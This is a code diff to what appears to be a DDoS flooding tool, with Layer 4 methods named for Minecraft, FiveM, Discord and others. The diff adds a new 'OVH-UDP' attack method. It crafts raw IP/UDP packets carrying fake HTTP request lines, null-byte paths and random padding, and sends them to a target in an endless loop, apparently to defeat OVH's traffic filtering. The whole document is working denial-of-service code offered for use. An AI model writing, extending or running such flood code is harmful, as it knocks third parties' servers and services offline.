@@ -128,7 +128,7 @@ class Methods:
     LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                 "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
                                 "MCBOT", "CONNECTION", "CPS", "FIVEM", "FIVEM-TOKEN",
-                                "TS3", "MCPE", "ICMP", "DISCORD",
+                                "TS3", "MCPE", "ICMP", "DISCORD", "OVH-UDP",
                                 }
 
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
@@ -401,6 +401,7 @@ class Layer4(Thread):
             "MCPE": self.MCPE,
             "FIVEM": self.FIVEM,
             "FIVEM-TOKEN": self.FIVEMTOKEN,
+            "OVH-UDP": self.OVHUDP, 
             "DISCORD": self.DISCORD,
             "MINECRAFT": self.MINECRAFT,
             "CPS": self.CPS,
@@ -470,6 +471,14 @@ class Layer4(Thread):
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
             while Tools.sendto(s, randbytes(1024), self._target):
                 continue
+        Tools.safe_close(s)
+
+    def OVHUDP(self) -> None:
+        with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
+            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+            while True:
+                for payload in self._generate_ovhudp():
+                    Tools.sendto(s, payload, self._target)
         Tools.safe_close(s)
 
     def ICMP(self) -> None:
@@ -581,6 +590,42 @@ class Layer4(Thread):
             while Tools.sendto(s, payload, self._target):
                 continue
         Tools.safe_close(s)
+
+    def _generate_ovhudp(self) -> List[bytes]:
+        packets = []
+
+        methods = ["PGET", "POST", "HEAD", "OPTIONS", "PURGE"]
+        paths = ['/0/0/0/0/0/0', '/0/0/0/0/0/0/', '\\0\\0\\0\\0\\0\\0', '\\0\\0\\0\\0\\0\\0\\', '/', '/null', '/%00%00%00%00']
+
+        for _ in range(randint(2, 4)):
+            ip = IP()
+            ip.set_ip_src(__ip__)
+            ip.set_ip_dst(self._target[0])
+
+            udp = UDP()
+            udp.set_uh_sport(randint(1024, 65535))
+            udp.set_uh_dport(self._target[1])
+
+            payload_size = randint(1024, 2048)
+            random_part = randbytes(payload_size).decode("latin1", "ignore")
+
+            method = randchoice(methods)
+            path = randchoice(paths)
+
+            payload_str = (
+                f"{method} {path}{random_part} HTTP/1.1\n"
+                f"Host: {self._target[0]}:{self._target[1]}\r\n\r\n"
+            )
+
+            payload = payload_str.encode("latin1", "ignore")
+
+            udp.contains(Data(payload))
+            ip.contains(udp)
+
+            packets.append(ip.get_packet())
+
+        return packets
+
 
     def _generate_discord(self) -> bytes:
         ip: IP = IP()
